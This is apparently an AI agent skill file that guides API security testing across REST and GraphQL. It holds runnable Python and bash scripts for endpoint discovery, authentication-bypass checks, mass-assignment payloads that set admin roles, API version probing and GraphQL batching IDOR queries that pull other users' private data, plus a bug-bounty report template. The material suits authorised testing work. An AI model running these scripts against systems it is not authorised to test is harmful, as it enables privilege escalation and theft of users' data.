---
name: api-testing
description: Elite API security testing — REST, GraphQL, WebSocket, gRPC — covering authentication bypass, mass assignment, versioning attacks, parameter discovery, injection in all contexts, mandatory UI discovery phase, and real impact validation
---

# API Security Testing

Modern applications are API-first. Every feature is an API endpoint. APIs are often less secured than UI — they lack WAF protection, skip input validation, and have inconsistent authorization. Thorough API testing requires understanding the API design, reading all documentation, and testing every endpoint with every vulnerability class.

**CRITICAL RULE: Always read the API documentation before testing. Documentation reveals endpoints, parameters, authentication methods, and business flows that automated scanning misses entirely.**

---

## Real Impact Gate — Answer Before Reporting

1. **Is the API endpoint actually exposing a vulnerability or is this by design?**
   - Check API documentation — is this endpoint documented as public?
   - Check if the response actually contains sensitive data
   - Check if the action performed is actually unauthorized or just unexpected

2. **What is the specific impact?**
   - Mass assignment: what unauthorized field was modified? What is the consequence? (Admin access granted? Payment bypassed? Account compromised?)
   - API versioning: what is accessible in old version that isn't in new? Is it actually exploitable?
   - Information disclosure: is the disclosed information actually sensitive? Does it enable further attack?

3. **Have you demonstrated actual exploitation?**
   - Mass assignment: show the unauthorized field change persisted in the database
   - IDOR via API: show User B's session can extract User A's data from the API
   - Authentication bypass: show access to protected endpoints without credentials

---

## Phase 0: API Documentation Discovery (MANDATORY FIRST STEP)

Never start API testing without first reading all available documentation.

### Documentation Endpoint Discovery
```bash
# Try all common documentation paths
doc_paths=(
    "/swagger.json" "/swagger.yaml" "/swagger/v1/swagger.json"
    "/swagger-ui.html" "/swagger-ui/" "/swagger-ui/index.html"
    "/api-docs" "/api-docs.json" "/api/docs" "/api/documentation"
    "/openapi.json" "/openapi.yaml" "/openapi" "/api/openapi.json"
    "/v1/docs" "/v2/docs" "/v3/docs" "/api/v1/docs" "/api/v2/docs"
    "/redoc" "/redoc/" "/redoc/index.html"
    "/.well-known/openapi" "/.well-known/api-docs"
    "/graphql" "/graphiql" "/graphql/playground"
    "/api/schema" "/schema.json" "/api/spec" "/spec/v1"
    "/docs" "/developer" "/developer/docs" "/developer/api"
    "/api/explorer" "/explorer" "/api/console"
    "/v1/swagger" "/api/v1/swagger" "/api/swagger"
)

for path in "${doc_paths[@]}"; do
    resp=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com${path}")
    if [ "$resp" == "200" ]; then
        echo "FOUND: https://target.com${path}"
        curl -s "https://target.com${path}" | head -50
    fi
done
```

### Parse OpenAPI/Swagger Spec
```python
import json, yaml, requests

def parse_api_spec(spec_url, session_cookie=None):
    """Parse OpenAPI/Swagger spec and extract all endpoints"""
    
    headers = {}
    if session_cookie:
        headers["Cookie"] = f"session={session_cookie}"
    
    r = requests.get(spec_url, headers=headers)
    
    try:
        if spec_url.endswith(".yaml") or spec_url.endswith(".yml"):
            spec = yaml.safe_load(r.text)
        else:
            spec = r.json()
    except:
        print(f"Failed to parse spec from {spec_url}")
        return []
    
    endpoints = []
    paths = spec.get("paths", {})
    base_path = spec.get("basePath", "") or spec.get("servers", [{}])[0].get("url", "")
    
    for path, methods in paths.items():
        for method, details in methods.items():
            if method in ["get", "post", "put", "patch", "delete", "head", "options"]:
                endpoint = {
                    "method": method.upper(),
                    "path": f"{base_path}{path}",
                    "summary": details.get("summary", ""),
                    "parameters": details.get("parameters", []),
                    "request_body": details.get("requestBody", {}),
                    "security": details.get("security", []),
                    "tags": details.get("tags", [])
                }
                endpoints.append(endpoint)
                print(f"{method.upper()} {base_path}{path} — {details.get('summary', '')}")
    
    return endpoints
```

### GraphQL Introspection
```python
def graphql_introspection(graphql_url, session_cookie=None):
    """Execute full GraphQL introspection to enumerate all types and operations"""
    
    introspection_query = """
    {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          name
          kind
          fields {
            name
            type { name kind ofType { name kind } }
            args { name type { name kind } }
          }
        }
      }
    }
    """
    
    headers = {"Content-Type": "application/json"}
    if session_cookie:
        headers["Cookie"] = f"session={session_cookie}"
    
    r = requests.post(graphql_url,
        json={"query": introspection_query},
        headers=headers)
    
    if r.status_code == 200 and "data" in r.json():
        schema = r.json()["data"]["__schema"]
        print("GraphQL Introspection ENABLED — Schema exposed:")
        
        # Extract all queries
        if schema.get("queryType"):
            query_type = next(t for t in schema["types"] if t["name"] == schema["queryType"]["name"])
            print("\nAvailable Queries:")
            for field in (query_type.get("fields") or []):
                print(f"  {field['name']}({', '.join(a['name'] for a in field.get('args', []))})")
        
        # Extract all mutations
        if schema.get("mutationType"):
            mutation_type = next(t for t in schema["types"] if t["name"] == schema["mutationType"]["name"])
            print("\nAvailable Mutations:")
            for field in (mutation_type.get("fields") or []):
                print(f"  {field['name']}({', '.join(a['name'] for a in field.get('args', []))})")
        
        return schema
    else:
        print("GraphQL Introspection DISABLED or failed")
        return None
```

---

## Phase 1: Endpoint Discovery via UI + JS Analysis

Don't rely only on documentation — discover endpoints through active exploration.

### UI Navigation for API Discovery
```
Step 1: Log in to the application
Step 2: Enable proxy (Caido) to capture ALL requests
Step 3: Navigate through EVERY section of the application:
  - Click every menu item, every button, every tab
  - Perform every action available to your user type
  - Open every modal, every form
Step 4: In proxy history, filter for API requests (/api/, /v1/, /v2/, /rest/, /graphql)
Step 5: Build comprehensive endpoint list from proxy history
Step 6: Note ALL parameters observed in requests: path params, query params, body params, headers
```

### JavaScript Analysis for Hidden Endpoints
```bash
# Download all JS files
katana -u https://target.com -jc -o /workspace/js_urls.txt
wget -i /workspace/js_urls.txt -P /workspace/js_files/ 2>/dev/null

# Extract API endpoints from JS
js-beautify /workspace/js_files/*.js -o /workspace/js_deobfuscated/

# Pattern matching for API endpoints
grep -rhoE '["\x27](/api/v?[0-9]*[^"\x27]{5,})["\x27]' /workspace/js_deobfuscated/ | \
  sed "s/[\"']//g" | sort -u > /workspace/js_endpoints.txt

# Look for fetch/axios/xhr calls
grep -rhoE "(fetch|axios\.(get|post|put|delete|patch)|XMLHttpRequest)[^;]{10,100}" \
  /workspace/js_deobfuscated/ | head -100

# Find base URLs and API configs
grep -rhoE "(baseURL|API_URL|API_BASE|apiBase|endpoint)[^;]{5,100}" \
  /workspace/js_deobfuscated/ | head -50
```

---

## Phase 2: Authentication Testing

### Test Every Authentication Bypass
```python
def test_api_auth_bypass(endpoint, session_cookie, jwt_token=None):
    """Test authentication bypass on API endpoints"""
    
    test_cases = [
        # No authentication at all
        {"headers": {}, "cookies": {}, "name": "no_auth"},
        # Empty Bearer token
        {"headers": {"Authorization": "Bearer "}, "cookies": {}, "name": "empty_bearer"},
        # Invalid token
        {"headers": {"Authorization": "Bearer INVALID_TOKEN"}, "cookies": {}, "name": "invalid_bearer"},
        # Null token
        {"headers": {"Authorization": "Bearer null"}, "cookies": {}, "name": "null_bearer"},
        # Different user's token (if you have one)
        {"headers": {"Authorization": f"Bearer {jwt_token}"}, "cookies": {}, "name": "other_user_token"},
        # Expired token (modify JWT exp claim to past timestamp)
        {"headers": {"Authorization": "Bearer EXPIRED_JWT"}, "cookies": {}, "name": "expired_token"},
        # Token in wrong location
        {"headers": {}, "cookies": {"token": jwt_token or "test"}, "params": {"token": jwt_token or "test"}, "name": "token_in_query"},
    ]
    
    results = []
    for test in test_cases:
        r = requests.get(endpoint,
            headers=test.get("headers", {}),
            cookies=test.get("cookies", {}),
            params=test.get("params", {}))
        
        if r.status_code == 200:
            print(f"AUTH BYPASS via {test['name']}: {r.status_code} — {r.text[:100]}")
            results.append(test['name'])
    
    return results
```

---

## Phase 3: Mass Assignment Testing

```
UI NAVIGATION FOR MASS ASSIGNMENT DISCOVERY:

Step 1: Navigate to profile update or resource creation form
Step 2: Fill in normal fields and submit
Step 3: Observe the POST/PUT request in proxy:
  {"name": "Test User", "bio": "Hello"}
Step 4: Look at the response — what fields does it return?
  {"id": 123, "name": "Test User", "bio": "Hello", "role": "user", "isPremium": false, "credits": 0}
Step 5: The response reveals ALL model fields — including ones not in the form
Step 6: Now resend the request with extra privileged fields added:
  {"name": "Test User", "bio": "Hello", "role": "admin", "isPremium": true, "credits": 9999}
Step 7: Check if the privileged fields were saved
```

```python
def test_mass_assignment(endpoint, method, session_cookie, normal_payload):
    """Test for mass assignment vulnerabilities"""
    
    # First: observe what fields are returned in responses (these are the model fields)
    r_normal = requests.request(method, endpoint,
        json=normal_payload, cookies={"session": session_cookie})
    
    if r_normal.status_code != 200:
        return
    
    model_fields = r_normal.json() if isinstance(r_normal.json(), dict) else {}
    print(f"Model fields visible: {list(model_fields.keys())}")
    
    # Test injecting privileged fields
    privileged_fields_to_test = [
        {"role": "admin"},
        {"isAdmin": True},
        {"isPremium": True},
        {"is_superuser": True},
        {"admin": True},
        {"verified": True},
        {"email_verified": True},
        {"credits": 99999},
        {"balance": 99999},
        {"subscription_plan": "enterprise"},
        {"permissions": ["admin", "superuser"]},
        {"account_type": "premium"},
    ]
    
    for extra_fields in privileged_fields_to_test:
        modified_payload = dict(normal_payload)
        modified_payload.update(extra_fields)
        
        r = requests.request(method, endpoint,
            json=modified_payload, cookies={"session": session_cookie})
        
        if r.status_code == 200:
            response_data = r.json()
            # Check if the privileged field was saved
            for field, value in extra_fields.items():
                if response_data.get(field) == value:
                    print(f"MASS ASSIGNMENT: Field '{field}' was set to '{value}'!")
                    
                    # Verify persistence
                    r_verify = requests.get(endpoint.replace("/update", "/profile"),
                        cookies={"session": session_cookie})
                    if r_verify.json().get(field) == value:
                        print(f"CONFIRMED: Mass assignment of '{field}' persisted in database!")
```

---

## Phase 4: API Versioning Attacks

```python
def test_api_versioning(base_url, endpoint_path, session_cookie):
    """Test if older API versions have weaker security"""
    
    version_prefixes = [
        "/api/v0", "/api/v1", "/api/v2", "/api/v3",
        "/v0", "/v1", "/v2", "/v3",
        "/api/beta", "/api/internal", "/api/dev",
        "/api/old", "/api/legacy",
        "/api/2023", "/api/2022", "/api/2021",
    ]
    
    for prefix in version_prefixes:
        url = f"{base_url}{prefix}{endpoint_path}"
        
        # Test without authentication
        r_unauth = requests.get(url)
        # Test with authentication
        r_auth = requests.get(url, cookies={"session": session_cookie})
        
        if r_unauth.status_code == 200:
            print(f"UNAUTH ACCESS via {prefix}: {url} — {r_unauth.text[:100]}")
        elif r_auth.status_code == 200:
            print(f"Found active version at {prefix}: {url}")
```

---

## Phase 5: Parameter Discovery

```bash
# Find hidden parameters with arjun
arjun -u "https://target.com/api/users/search" \
  -m GET \
  --headers "Cookie: session=USER_SESSION" \
  -o /workspace/params_search.json \
  --stable \
  -w /usr/share/wordlists/arjun-params.txt

# Also test with POST method
arjun -u "https://target.com/api/users/update" \
  -m POST \
  --headers "Cookie: session=USER_SESSION\nContent-Type: application/json" \
  -o /workspace/params_update.json
```

---

## Phase 6: GraphQL-Specific Attacks

### GraphQL IDOR via Batching
```python
def test_graphql_idor_batching(graphql_url, user_a_id, user_b_id, user_b_token):
    """Test IDOR via GraphQL batching — access User A's data as User B"""
    
    # Batch query: request own data AND other user's data in one request
    batch_query = f"""
    {{
        me: user(id: "{user_b_id}") {{
            id email
        }}
        victim: user(id: "{user_a_id}") {{
            id email phone address
            privateMessages {{
                content sender {{ email }}
            }}
            billingInfo {{
                cardLast4 billingAddress
            }}
        }}
    }}
    """
    
    r = requests.post(graphql_url,
        json={"query": batch_query},
        headers={
            "Authorization": f"Bearer {user_b_token}",
            "Content-Type": "application/json"
        })
    
    data = r.json().get("data", {})
    if "victim" in data and data["victim"]:
        print(f"GRAPHQL IDOR via batching: accessed User A's data as User B")
        print(f"Leaked: {data['victim']}")
        return True
    return False

### GraphQL Introspection in Production
```python
def test_graphql_introspection_production(graphql_url):
    """Introspection enabled in production = information disclosure"""
    r = requests.post(graphql_url,
        json={"query": "{__schema{types{name}}}"},
        headers={"Content-Type": "application/json"})
    
    if "types" in r.text and "__Schema" in r.text:
        print("GRAPHQL INTROSPECTION ENABLED in production!")
        # This reveals the entire schema — all types, fields, mutations
        # It's informational but also a starting point for further attacks
        return True
    return False
```

---

## UI Reproduction Steps — Required in Every Report

```
MASS ASSIGNMENT IN USER PROFILE UPDATE:

Step 1: Log in as User A (a regular, non-admin user)
Step 2: Navigate to https://target.com/profile/edit
Step 3: Open browser DevTools → Network tab
Step 4: Change the "Display Name" field to "Test Update" and click Save
Step 5: In the Network tab, find the PUT/PATCH request to /api/user/profile
Step 6: Right-click → Copy as cURL
Step 7: Observe the original request body:
        {"display_name": "Test Update"}
Step 8: Observe the response body:
        {"id": 123, "display_name": "Test Update", "role": "user", "is_admin": false}
        ← The response reveals "role" and "is_admin" fields exist in the user model

Step 9: Resend the request with added fields (via proxy or curl):
        {"display_name": "Test Update", "role": "admin", "is_admin": true}

Step 10: Observe the response:
        {"id": 123, "display_name": "Test Update", "role": "admin", "is_admin": true}
        ← The response shows role and is_admin were updated

Step 11: Navigate to https://target.com/admin (admin panel)
Step 12: Observe: the admin panel is now accessible with User A's account
Step 13: Screenshot: User A's account now showing as admin with full admin panel access
```

---

## Complete Report Format

**TITLE**: Mass Assignment in User Profile Update — Privilege Escalation to Admin via `role` Parameter

**SEVERITY**: Critical

**RAW HTTP REQUEST**:
```
PUT /api/user/profile HTTP/1.1
Host: target.com
Cookie: session=USER_A_SESSION  ← Regular user's session
Content-Type: application/json
Authorization: Bearer USER_A_JWT

{"display_name":"Test","role":"admin","is_admin":true}
```

**RAW HTTP RESPONSE**:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 123,
  "display_name": "Test",
  "role": "admin",       ← Role changed to admin
  "is_admin": true,      ← Admin flag set to true
  "email": "usera@test.com"
}
```

**EXACT LOCATION**:
- URL: PUT https://target.com/api/user/profile
- Vulnerable parameter: `role` and `is_admin` in JSON body — accepted without authorization check
- UI location: Profile → Edit Profile → "Save Changes" button → underlying API call

**VALIDATION**:
- Signal 1: PUT /api/user/profile with `"role":"admin"` returns 200 with role:admin confirmed in response
- Signal 2: Navigating to /admin/dashboard now returns 200 with full admin panel — previously returned 403. Admin panel shows all user accounts, system logs, and configuration settings.

**REAL IMPACT**:
Any authenticated user can promote themselves to admin by adding `"role":"admin"` to any profile update request. This grants complete administrative access to the platform: all user accounts and PII, system configuration, ability to delete/modify any user's data, financial records, audit logs. The attack requires a single modified HTTP request and takes 30 seconds. All [N] regular user accounts are potential vectors for admin takeover.

---

## False Positive Rejection Rules

- API versioning: old version exists but returns identical or sanitized data → Informational
- Mass assignment: extra fields accepted by server but ignored (no database update) → NOT a vulnerability
- GraphQL introspection enabled: informational only unless the schema reveals sensitive data or enables further exploitation
- Parameter discovery: hidden parameter found but it doesn't affect response or behavior → NOT a vulnerability
- API authentication not required on public endpoint: check if it's documented as public → if yes, NOT a vulnerability
- Different error messages for different invalid inputs: informational unless it reveals sensitive data (user existence, file paths, SQL syntax)
